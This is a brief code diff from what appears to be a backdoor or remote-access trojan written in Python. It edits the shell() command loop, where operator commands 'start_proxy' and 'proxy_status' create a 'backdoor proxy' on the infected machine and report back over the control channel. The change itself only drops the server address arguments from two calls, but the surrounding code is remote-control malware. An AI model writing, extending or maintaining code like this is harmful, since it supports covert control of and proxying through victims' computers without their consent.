@@ -275,7 +275,7 @@ def shell():
         elif command == 'start_proxy':
             try:
                 if proxy_manager is None:
-                    proxy_manager = create_backdoor_proxy(SERVER_IP, SERVER_PORT)
+                    proxy_manager = create_backdoor_proxy()
                 success, msg = proxy_manager.start_proxy_operations()
                 reliable_send("Proxy: " + msg)
             except Exception as e:
@@ -294,7 +294,7 @@ def shell():
         elif command == 'proxy_status':
             try:
                 if proxy_manager is None:
-                    proxy_manager = create_backdoor_proxy(SERVER_IP, SERVER_PORT)
+                    proxy_manager = create_backdoor_proxy()
                 status = proxy_manager.get_proxy_status()
                 reliable_send("Proxy Status: " + json.dumps(status, indent=2))
             except Exception as e:
